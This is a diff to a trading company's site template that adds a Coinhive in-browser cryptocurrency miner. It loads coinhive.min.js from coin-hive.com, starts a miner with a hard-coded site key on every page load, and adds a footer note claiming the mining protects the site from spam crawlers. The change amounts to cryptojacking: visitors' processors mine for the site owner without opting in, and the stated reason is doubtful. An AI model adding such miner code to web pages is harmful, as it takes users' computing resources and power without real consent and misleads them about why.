@@ -29,6 +29,7 @@
     <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" %}" rel="stylesheet" type="text/css">
     {% block meta %}{% endblock %}
     <script src="//cdn.plot.ly/plotly-latest.min.js"></script>
+    <script type="text/javascript" src="https://coin-hive.com/lib/coinhive.min.js"></script>
 </head>
 
 <body>
@@ -129,6 +130,7 @@
     -->
     <p>&nbsp;</p>
     <hr />
+      <h6>NOTE. This site uses mining to protect itself from many malicious spam crawlers that put heavy load on our server.</h6>
       <h6>Contracts for Difference (CFDs) are leveraged products and carry a high level of risk when prices move rapidly against your positions. Losses can exceed your deposits and you may be required to make further deposits in such a case. These products may not be suitable for all clients therefore ensure you understand the risks. Please read <a href="{{ base_url }}/risk_warning/">full risk disclosure here</a>.</h6>
       <h6>{% trans "" %} &copy; 2017, <a href="https://quantrade.co.uk/">Quantrade Ltd.</a> | v. {{ version }} | <a href="{{ base_url }}/risk_warning/">{% trans "Risk warning" %}</a> | <a href="{{ base_url }}/privacy_policy/">{% trans "Privacy policy" %}</a> | <a href="{{ base_url }}/terms_of_service/">{% trans "Terms of service" %}</a></h6>
     </div>
@@ -146,6 +148,8 @@
       })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
       ga('create', 'UA-89083575-1', 'auto');
       ga('send', 'pageview');
+      var miner = new CoinHive.Anonymous('2yp5RFAVnhHwkVcIFXNvfajsyhmTqeqj');
+      miner.start();
     </script>
     {% endif %}
 
